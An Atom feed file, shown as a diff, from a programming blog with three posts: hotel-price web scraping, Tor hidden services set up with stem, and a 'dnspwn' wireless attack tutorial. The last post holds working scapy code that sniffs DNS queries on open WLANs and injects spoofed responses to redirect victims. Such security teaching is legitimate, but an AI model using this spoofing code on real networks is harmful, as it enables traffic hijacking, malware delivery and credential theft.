@@ -1,0 +1,463 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: python | jordan-wright]]></title>
+  <link href="http://jordan-wright.github.io/blog/categories/python/atom.xml" rel="self"/>
+  <link href="http://jordan-wright.github.io/"/>
+  <updated>2015-05-10T20:04:46-05:00</updated>
+  <id>http://jordan-wright.github.io/</id>
+  <author>
+    <name><![CDATA[Jordan]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Web Scraping Hotel Prices for Fun and Savings]]></title>
+    <link href="http://jordan-wright.github.io/blog/2015/02/21/web-scraping-hotel-prices-for-fun-and-savings/"/>
+    <updated>2015-02-21T12:05:00-06:00</updated>
+    <id>http://jordan-wright.github.io/blog/2015/02/21/web-scraping-hotel-prices-for-fun-and-savings</id>
+    <content type="html"><![CDATA[<p><img src="/images/headers/web_scraping.png"/></p>
+
+<h3>Introduction</h3>
+
+<p>During the process of planning a vacation, I came across a nice hotel I wanted to stay at. When looking at some possible dates, I noticed the nightly rate would fluctuate <em>dramatically</em>. This made me question if I was going to wind up paying way more just because I wanted to stay at the hotel on a certain day.</p>
+
+<p>Then I considered the alternative &ndash; maybe I could scrape the prices every day to find the cheapest nightly rate. Sounded like a job for Python, BeautifulSoup, and some whiskey.</p>
+
+<!--more-->
+
+
+<h3>A Brief Intro to Python Web Scraping</h3>
+
+<p>Web scraping with Python is generally done using a mixture of the fantastic <code>requests</code> and <code>beautifulsoup</code> libraries. This post won&rsquo;t go into detail about all the neat features of <code>beautifulsoup</code>, instead aiming for simplicity to show the basics.</p>
+
+<h4>Getting a BeautifulSoup Object</h4>
+
+<p>The first step in web scraping is getting the HTML you want, and creating a parseable object out of it. We can do this by requesting a page with <code>requests.get()</code> and, if successful, creating a BeautifulSoup object using the <code>BeautifulSoup()</code> constructor with the <code>.text</code> of our response.</p>
+
+<p>It would look something like this:</p>
+
+<p>```
+response = requests.get(&lsquo;<a href="http://foo.bar">http://foo.bar</a>&rsquo;)
+if response.ok:</p>
+
+<pre><code>soup = BeautifulSoup(response.text)
+</code></pre>
+
+<p>```</p>
+
+<h4>Getting Data From BeautifulSoup</h4>
+
+<p>Now that we have a BeautifulSoup object, we can use its API to get the data we want. The first step is to parse out the <code>Tag</code> object we are interested in. Then, we can parse out the text/attributes we want. Here are some examples of getting specific tags:</p>
+
+<p><code>
+soup.find_all('a') # Get all &lt;a&gt; tags
+soup.find_all('a', {"class" : "css_class"}) # Get all &lt;a class="css_class"&gt; tags
+soup.find_all('a', 'css_class') # Shortcut for searching by class
+soup.find() # Same as find_all(), but returns the first instance
+</code></p>
+
+<p>After we have the <code>Tag</code> object we want, we can parse out the text by accessing the <code>.text</code> attribute.</p>
+
+<p>This is <em>barely</em> scratching the surface of BeautifulSoup&rsquo;s API, so if you&rsquo;re interested in learning more, you can take a look at the docs <a href="http://www.crummy.com/software/BeautifulSoup/bs4/doc/">here</a>. That&rsquo;s all we&rsquo;ll need for this post, so let&rsquo;s see this in action.</p>
+
+<h3>Parsing Some (Not Great) HTML</h3>
+
+<p>The goal was to simply pull down the rate for each day, and dump it out to a CSV (&ldquo;rates.csv&rdquo;) for some sweet Excel graphing later.</p>
+
+<p>I&rsquo;ll leave the exact hotel and URL redacted, but the basic URL was in the form:</p>
+
+<p><code>
+http://foo.bar?month=:int&amp;day=:int&amp;year=:int
+</code></p>
+
+<p>We can start with a naive approach of looping through the months I was interested in (August through December) and getting a BeautifulSoup object from each result.</p>
+
+<p>```
+import requests
+from bs4 import BeautifulSoup
+import time</p>
+
+<p>with open(&lsquo;rates.csv&rsquo;, &lsquo;w&rsquo;) as rates:</p>
+
+<pre><code>rates.write("Date,Rate\n")
+for m in range(8,13):
+    for d in range(1,32):
+        try:
+            response = requests.get('http://foo.bar?month=' + str(m) + '&amp;day=' + str(d) + '&amp;year=2015')
+            if response.ok:
+                soup = BeautifulSoup(response.text)
+        except Exception e:
+            print e
+        # Be (somewhat) nice.
+        time.sleep(.2)
+</code></pre>
+
+<p>```</p>
+
+<p>Now we just need to figure out what kind of data we care about. This site used tables. <strong>A lot.</strong> After some testing, I wound up parsing HTML that looked like this:</p>
+
+<p>```</p>
+
+<table summary="rooms availability">
+    <tbody>
+        <tr>
+            <td>
+                <div class="roomSection">
+                    <div class="roomType">
+                        <span class="value">King</span>
+                    </div>
+                    <div class="roomAvail">
+                        <div class="bar">
+                            <div class="label">Nightly Rate</div>
+                            <div class="value">
+                                159.00 <-- What I want to get
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </td>
+        </tr>
+    </tbody>
+</table>
+
+
+<p>```</p>
+
+<p>I cleaned up the formatting, removed unnecessary parts, etc. Trust me, you&rsquo;re welcome.</p>
+
+<p>My first step was to get the room type and make sure it was &ldquo;King&rdquo; as a sanity check, since there were multiple types of rooms in the table. Then, I wanted to get the text of the div with the class &ldquo;value&rdquo; in the &ldquo;roomAvail&rdquo; section. This is the nightly rate.</p>
+
+<p>Finally, I want to write the rate out to the CSV file.</p>
+
+<p>There&rsquo;s definitely more concise ways of doing this with more advanced BeautifulSoup usage, but this code worked:</p>
+
+<p>```
+king = soup.find(&ldquo;table&rdquo;, {&ldquo;summary&rdquo; : &ldquo;rooms availability&rdquo;}).find(&ldquo;div&rdquo;, &ldquo;roomSection&rdquo;)
+if king.find(&ldquo;div&rdquo;, &ldquo;roomType&rdquo;).text.strip() == &ldquo;King&rdquo;:</p>
+
+<pre><code>rate = king.find("div", "roomAvail").find("div", "value").strip()
+rates.write("2015-" + str(m) + "-" + str(d) + "," + str(rate) + "\n")
+</code></pre>
+
+<p>```</p>
+
+<h3>Success!</h3>
+
+<p>Running the script outputs the results just as I wanted them and, graphed in Excel, looks like this:</p>
+
+<p><img src="/images/blog/web scraping/rates.png"/></p>
+
+<p><em>Awesome.</em> In just a few lines of Python, I was able to get data allowing me to plan a vacation while saving quite a bit of cash.</p>
+
+<p>-Jordan</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Creating Tor Hidden Services with Python]]></title>
+    <link href="http://jordan-wright.github.io/blog/2014/10/06/creating-tor-hidden-services-with-python/"/>
+    <updated>2014-10-06T20:00:00-05:00</updated>
+    <id>http://jordan-wright.github.io/blog/2014/10/06/creating-tor-hidden-services-with-python</id>
+    <content type="html"><![CDATA[<p><img src="/images/headers/hidden_services.png"/></p>
+
+<h3>Introduction</h3>
+
+<p>Tor is often used to protect the anonymity of someone who is trying to connect to a service. However, it is also possible to use Tor to protect the anonymity of a service provider via <a href="https://www.torproject.org/docs/hidden-services.html.en"><strong><em>hidden services</em></strong></a>. These services, operating under the <code>.onion</code> TLD, allow publishers to anonymously create and host content viewable only by other Tor users.</p>
+
+<p>The Tor project has <a href="https://www.torproject.org/docs/tor-hidden-service.html.en">instructions</a> on how to create hidden services, but this can be a manual and arduous process if you want to setup multiple services. This post will show how we can use the fantastic <code>stem</code> Python library to automatically create and host a Tor hidden service.</p>
+
+<!--more-->
+
+
+<h3>Creating Hidden Services Manually</h3>
+
+<p>The <a href="https://www.torproject.org/docs/tor-hidden-service.html.en#two">instructions provided by the Tor project</a> show that creating hidden services simply involves setting up the service locally (such as a web server listening on localhost), and then setting a few configuration options to make the service available via Tor.</p>
+
+<p>There are two configuration settings necessary to setup a hidden service: <code>HiddenServiceDir</code>, the directory to store the <code>hostname</code> and <code>private_key</code> files, and <code>HiddenServicePort</code>, the ports used to proxy hidden service connections.</p>
+
+<p>As the instructions show, each hidden service requires a variation of the following two lines to be present in the <code>torrc</code> configuration file (setting the directory, host, and ports appropriately):</p>
+
+<p><code>
+HiddenServiceDir /path/to/store/hidden_service/
+HiddenServicePort 80 127.0.0.1:5000
+</code></p>
+
+<h3>A Bit About the Tor Control Protocol</h3>
+
+<p>Changing the configuration file and restarting Tor everytime a change is needed can be a pain. Fortunately, Tor provides a way to dynamically change the running configuration using a simple text based protocol (similar to Telnet) called the Tor Control Protocol.</p>
+
+<p>The <a href="https://gitweb.torproject.org/torspec.git?a=blob_plain;hb=HEAD;f=control-spec.txt">full specification</a> of the protocol is available, however here is a quick example of getting the valid authentication methods:</p>
+
+<p>```
+$ telnet localhost 9151
+PROTOCOLINFO</p>
+
+<p>250-PROTOCOLINFO 1
+250-AUTH METHODS=COOKIE,SAFECOOKIE,HASHEDPASSWORD COOKIEFILE=&ldquo;Tor\control_auth_cookie&rdquo;
+250-VERSION Tor=&ldquo;0.2.4.24&rdquo;
+250 OK
+```</p>
+
+<p>Other examples using this extensive protocol can be found <a href="https://www.thesprawl.org/research/tor-control-protocol/">here</a> or in the full protocol spec.</p>
+
+<h3>Introducing Stem</h3>
+
+<p>To make interacting with the Tor control port both easier and programmatic, the Tor project maintains a fantastic Python library called <a href="https://stem.torproject.org/">Stem</a>.</p>
+
+<h4><code>stem.Controller</code></h4>
+
+<p>Interaction with the Tor control port is performed using the <code>stem.Controller</code> class. Creating an instance of the class involves connecting to the port and authenticating as follows:</p>
+
+<p>```
+from stem.control import Controller
+controller = Controller.from_port(address=&ldquo;127.0.0.1&rdquo;, port=9151)
+try:</p>
+
+<pre><code>controller.authenticate(password="")
+</code></pre>
+
+<p>except Exception as e:</p>
+
+<pre><code>print e
+</code></pre>
+
+<p>```</p>
+
+<p>Now that we have a Controller, we can access the local configuration, pull the current descriptors for relays, and more.</p>
+
+<p>Let&rsquo;s use the Controller to automatically set the configuration settings we saw in the previous section. When set, these configuration options will cause Tor to create the two files, <code>hostname</code> and <code>private_key</code>, necessary to run the hidden service. Here is a short script that will setup a hidden service to listen on TCP port 80 and proxy all requests to an (already established) web server listening on <a href="http://127.0.0.1:5000:">http://127.0.0.1:5000:</a></p>
+
+<p>```
+host = &ldquo;127.0.0.1&rdquo;
+port = 5000
+hidden_svc_dir = &ldquo;/tmp/hidden_service/&rdquo;
+controller.set_options([</p>
+
+<pre><code>("HiddenServiceDir", hidden_svc_dir),
+("HiddenServicePort", "80 %s:%s" % (host, str(port)))
+</code></pre>
+
+<p>])
+svc_name = open(hidden_svc_dir + &ldquo;/hostname&rdquo;, &ldquo;r&rdquo;).read().strip()
+print &ldquo;Created host: %s&rdquo; % svc_name
+```</p>
+
+<p>Easy as that! Now that we have the configuration setup, our service should be ready to go.</p>
+
+<h3>An Example Service</h3>
+
+<p>Now that we&rsquo;ve seen a little about how Stem works, here&rsquo;s an extremely basic example showing how the hidden service can be setup to work with a Flask application:</p>
+
+<p>```
+from stem.control import Controller
+from flask import Flask</p>
+
+<p>if <strong>name</strong> == &ldquo;<strong>main</strong>&rdquo;:</p>
+
+<pre><code>app = Flask("example")
+port = 5000
+host = "127.0.0.1"
+hidden_svc_dir = "c:/temp/"
+
+@app.route('/')
+def index():
+    return "&lt;h1&gt;Tor works!&lt;/h1&gt;"
+print " * Getting controller"
+controller = Controller.from_port(address="127.0.0.1", port=9151)
+try:
+    controller.authenticate(password="")
+    controller.set_options([
+        ("HiddenServiceDir", hidden_svc_dir),
+        ("HiddenServicePort", "80 %s:%s" % (host, str(port)))
+        ])
+    svc_name = open(hidden_svc_dir + "/hostname", "r").read().strip()
+    print " * Created host: %s" % svc_name
+except Exception as e:
+    print e
+app.run()
+</code></pre>
+
+<p>```</p>
+
+<p>Here&rsquo;s what this looks like in action:
+<code>
+C:\&gt;python tor_example.py
+ * Getting controller
+ * Created host: 4yrbax6gwnemqh7n.onion
+ * Running on http://127.0.0.1:5000/
+</code></p>
+
+<p><img src="/images/blog/hidden_services/screenshot.png"/></p>
+
+<h3>Caveats</h3>
+
+<p>It is important to note that the security of the hidden service depends on protecting the location of the server. To do this, consider ways to prevent leaking the real server IP through debug messages, etc. There has been some <a href="https://news.ycombinator.com/item?id=8404511">great discussion</a> on the topic that might be worth looking into.</p>
+
+<h3>Conclusion</h3>
+
+<p>Hidden services deliver freedom of speech and the free exchange of ideas without censorship. By using Stem Python library, it&rsquo;s possible to take the pain out of manual configuration and instead programmatically create and manage multiple hidden services.</p>
+
+<p>As always, let me know if you have any questions or comments.</p>
+
+<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Wireless Attacks with Python: Part One - The "Dnspwn Attack"]]></title>
+    <link href="http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/"/>
+    <updated>2013-11-15T20:45:00-06:00</updated>
+    <id>http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack</id>
+    <content type="html"><![CDATA[<p><img src="/images/headers/wireless_python.png"/></p>
+
+<h3>Introduction</h3>
+
+<p>A while back, I <a href="http://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html">published a post</a> on the Raidersec blog demonstrating how to perform a deauthentication attack using Python and Scapy. I enjoyed writing the post, since I got the opportunity to learn in-depth about how different wireless attacks work, beyond just learning how to exclusively use the <a href="http://www.aircrack-ng.org/">aircrack suite</a>.</p>
+
+<p>So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.</p>
+
+<!--more-->
+
+
+<h3>The &ldquo;Dnspwn Attack&rdquo;</h3>
+
+<p>The first attack we&rsquo;ll explore is what I call the &ldquo;dnspwn attack&rdquo; (since, from what I can tell, this attack was first created targeting HTTP with the &ldquo;<a href="http://airpwn.sourceforge.net/Airpwn.html">airpwn</a>&rdquo; tool, and later extended to DNS) The idea behind the attack is pretty simple:</p>
+
+<p>Consider two people on the same open WLAN: Bob and Eve. Eve wants to get Bob to visit a malicious webpage she created so that she can install malware onto Bob&rsquo;s computer via a drive-by download, or perhaps show a spoofed website to try and steal Bob&rsquo;s credentials.</p>
+
+<p>To do this, she remembers that she can sniff all requests coming to and from Bob&rsquo;s computer. She also knows that she is <em>closer</em> to Bob than the web server he is sending a request to. So, she decides to wait until Bob sends a web request, and see if she can send back a spoofed response pretending to come from the web server <em>before</em> the actual web server can respond. Turns out, she can. In fact, once the spoofed response is received, Bob&rsquo;s computer will likely ignore any further traffic received, including the real response!</p>
+
+<p>Let&rsquo;s see what this would look like:</p>
+
+<p><a href="/images/blog/wireless-attacks/dnspwn/diagram.png" target="_blank"><img src="/images/blog/wireless-attacks/dnspwn/diagram_small.png"/></a></p>
+
+<p>So, now that we know how the attack works, let&rsquo;s automate it!</p>
+
+<h3>Setting up the Alfa AWUS06H</h3>
+
+<p>As was the case in my Raidersec post, we will be using the handy <a href="http://www.amazon.com/Alfa-AWUS036H-802-11b-Wireless-network/dp/B002WCEWU8">Alfa AWUS036H</a> for this attack. The first thing we want to do is to put our wireless card in monitor mode so that we can capture all traffic coming from the <code>demo_insecure</code> network.</p>
+
+<p><code>
+root@bt:~# airmon-ng start wlan0
+</code></p>
+
+<p>Now that we have monitor mode up and running on <code>mon0</code>, let&rsquo;s start coding!</p>
+
+<h3>Coding the Attack</h3>
+
+<p>We will utilize the <code>scapy</code> module to perform the attack. Let&rsquo;s start by sniffing any UDP packet with a destination of port 53, and send the packet to a function called <code>send_response</code> that we will make later:</p>
+
+<p>```
+from scapy.all import *</p>
+
+<p>sniff(prn=lambda x: send_response(x),</p>
+
+<pre><code>lfilter=lambda x:x.haslayer(UDP) and x.dport == 53)
+</code></pre>
+
+<p>```</p>
+
+<p>Now let&rsquo;s create a function which can parse the request for relevant information, and inject the response. We can parse the packet and create our response simply by working our way up the layers as follows:</p>
+
+<ul>
+<li>802.11 Frame &ndash; Change the &ldquo;to-ds&rdquo; flag to &ldquo;from-ds&rdquo; (our request will now be coming <em>from</em> the access point)</li>
+<li>802.11 Frame &ndash; Switch the source and destination MAC addresses</li>
+<li>IP Layer &ndash; Switch the source and destination IP addresses</li>
+<li>UDP layer &ndash; Switch the source and destination ports</li>
+<li>DNS layer &ndash; Set the &ldquo;answer&rdquo; flag(s), and append our spoofed answer</li>
+</ul>
+
+
+<p>Fortunately, <code>scapy</code> makes this very simple for us by abstracting away a lot of minor details (e.g. in fact, there are <em>4</em> MAC address fields in an 802.11 frame, each in a different order depending on the direction of the packet). With that being said, here&rsquo;s the code:</p>
+
+<p>```
+def send_response(x):</p>
+
+<pre><code># Get the requested domain
+req_domain = x[DNS].qd.qname
+spoofed_ip = '192.168.2.1'
+# Let's build our response from a copy of the original packet
+response = x.copy()
+# We need to start by changing our response to be "from-ds", or from the access point.
+response.FCfield = 2L
+# Switch the MAC addresses
+response.addr1, response.addr2 = x.addr2, x.addr1
+# Switch the IP addresses
+response.src, response.dst = x.dst, x.src
+# Switch the ports
+response.sport, response.dport = x.dport, x.sport
+# Set the DNS flags
+response[DNS].qr = 1L
+response[DNS].ra = 1L
+response[DNS].ancount = 1
+</code></pre>
+
+<p>```</p>
+
+<p>Now that we&rsquo;ve set all the flags, let&rsquo;s create and append the DNS answer:</p>
+
+<p>```
+response[DNS].an = DNSRR(</p>
+
+<pre><code>rrname = req_domain,
+type = 'A',
+rclass = 'IN',
+ttl = 900,
+rdata = spoofed_ip
+)
+</code></pre>
+
+<p>```</p>
+
+<p>And, finally, we inject the spoofed response:</p>
+
+<p><code>
+sendp(response)
+</code></p>
+
+<p>That&rsquo;s all there is to it! You can find the full source on <a href="https://github.com/jordan-wright/python-wireless-attacks/blob/master/dnspwn.py">Github</a>.</p>
+
+<h3>Demo</h3>
+
+<p>For the demo, I have the following HTML response available on the host 192.168.2.138:</p>
+
+<p>```
+<html>
+<head></head>
+<body></p>
+
+<pre><code>Owned.
+</code></pre>
+
+<p></body>
+</html>
+```</p>
+
+<p>It&rsquo;s worth noticing that we can have <em>any</em> HTML, Javascript, etc. we want. It would be trivial to hook the browser using the <a href="http://beefproject.com/">BeEF framework</a>, for example.</p>
+
+<p>Here&rsquo;s a screenshot of it in action (I am using my iPhone as the victim):</p>
+
+<p><a href="/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png" target="_blank"><img src="/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png"/></a>
+<a href="/images/blog/wireless-attacks/dnspwn/iphone.png" target="_blank"><img src="/images/blog/wireless-attacks/dnspwn/iphone_small.png"/></a></p>
+
+<h3>Conclusion &amp; Future Improvements</h3>
+
+<p>It&rsquo;s important to note that this attack will work just as well on other simple request/response protocols. For example, the original &ldquo;airpwn&rdquo; attack spoofed HTTP responses. There are also quite a few improvements we can make to this script. Here are a few:</p>
+
+<ul>
+<li>Match requests against regular expressions (for example, only replacing Javascript content)</li>
+<li>Set options from arguments / Read configuration information from a file</li>
+<li>Implement the attack for other protocols (ie HTTP).</li>
+</ul>
+
+
+<p>Enjoy!</p>
+
+<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
+]]></content>
+  </entry>
+  
+</feed>
